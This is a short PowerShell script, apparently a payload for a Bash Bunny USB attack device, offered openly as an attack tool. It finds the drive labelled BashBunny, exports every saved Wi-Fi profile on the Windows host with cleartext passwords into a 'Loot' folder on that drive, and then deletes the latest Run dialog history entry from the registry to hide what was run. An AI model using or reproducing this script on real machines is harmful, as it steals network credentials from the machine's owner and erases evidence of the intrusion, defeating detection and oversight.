#
# File:		profile.ps1
# Version:	1.1
# Author: 	Valerie Daugherty (bitwise)
# Desc: 	handles the actual exporting of profiles and some cleanup afterwards
#
# Last mod: registry cleanup
#



# get the drive letter for the bash bunny and export the wifi profiles
# with cleartext passwords
$drive = (gwmi win32_volume -f 'label=''BashBunny''').Name
Netsh wlan export profile key=clear folder=$drive\Loot\WiFi_Profiles

# delete the last ran command
$reg_path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$last_run=(Get-ItemProperty -Path $reg_path).MRUList[0]
Remove-ItemProperty -Path $reg_path -Name $last_run